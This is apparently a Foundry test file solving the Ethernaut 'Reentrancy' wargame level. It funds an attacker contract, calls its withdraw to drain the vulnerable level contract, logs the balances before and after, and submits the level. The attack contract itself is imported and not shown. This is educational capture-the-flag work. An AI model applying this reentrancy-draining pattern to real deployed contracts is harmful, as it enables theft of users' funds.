// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/Ethernaut.sol";
import "src/10-Reentrancy/ReentranceFactory.sol";
import "src/10-Reentrancy/Attacker.sol";

contract BaseSetUp is Test {

    Ethernaut ethernaut;
    address payable attacker;

    function setUp() public virtual {
        // Initialize Ethernaut contract
        ethernaut = new Ethernaut();

        // Initialize Attacker EOA
        attacker = payable(vm.addr(1));      
        vm.deal(attacker, 10 ether);
        vm.label(attacker, "Attacker");
    }
}

contract Attack is BaseSetUp {

    Reentrance ethernautReentrancy;
    address payable levelAddress;

    function setUp() public virtual override {
        BaseSetUp.setUp();

        // Initialize level
        ReentranceFactory reentrancyFactory = new ReentranceFactory();
        ethernaut.registerLevel(reentrancyFactory);

        vm.prank(attacker);
        levelAddress = payable(ethernaut.createLevelInstance{value: 1 ether}(reentrancyFactory));
        ethernautReentrancy = Reentrance(levelAddress);
        console.log("Ethernaut Reentrancy Challenge!");
    }

    function testAttack() public {

        Attacker attackerContract = new Attacker(address(ethernautReentrancy));

        // Fund attacker to have balance > 0
        vm.prank(attacker);
        ethernautReentrancy.donate{value:1 ether}(address(attackerContract));

        emit log_named_uint("attacker balance in contract", ethernautReentrancy.balanceOf(address(attackerContract)));
        emit log_named_uint("contract balance", address(ethernautReentrancy).balance);
        
        attackerContract.withdraw(1 ether);

        emit log_named_uint("contract balance after exploit", address(ethernautReentrancy).balance);
        emit log_named_uint("attacker balance after exploit", address(attackerContract).balance);
 
        // Submit Level
        vm.prank(attacker);
        bool passedLevel = ethernaut.submitLevelInstance(levelAddress);
        assert(passedLevel);
    }


}